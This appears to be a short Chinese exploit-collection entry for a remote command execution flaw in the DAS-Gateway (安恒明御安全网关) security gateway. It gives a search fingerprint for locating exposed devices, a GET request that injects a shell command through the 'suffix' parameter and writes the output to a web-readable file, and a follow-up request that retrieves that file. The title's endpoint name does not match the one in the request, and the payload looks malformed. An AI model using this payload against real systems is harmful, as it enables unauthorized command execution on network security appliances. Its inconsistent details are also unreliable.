# 安恒明御安全网关aaa_portal_auth_config_reset存在远程命令执行漏洞

- **系统**：安恒明御安全网关　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="安恒明御安全网关"`
- **请求**：`GET /webui/?g=aaa_portal_auth_wchat_submit&suffix=;echo%20%60whoami%60%20tee%20/usr/local/webui/sslvpn/stc.txtls HTTP/1.1`
- **关键头**：`Host: {hostname}`

**请求体 / payload**
```

获取命令执行结果
GET /sslvpn/stc.txt HTTP/1.1
Host: {hostname}
```

**其他**
- 安恒明御安全网关aaa\_portal\_auth\_config\_reset存在远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 安恒明御安全网关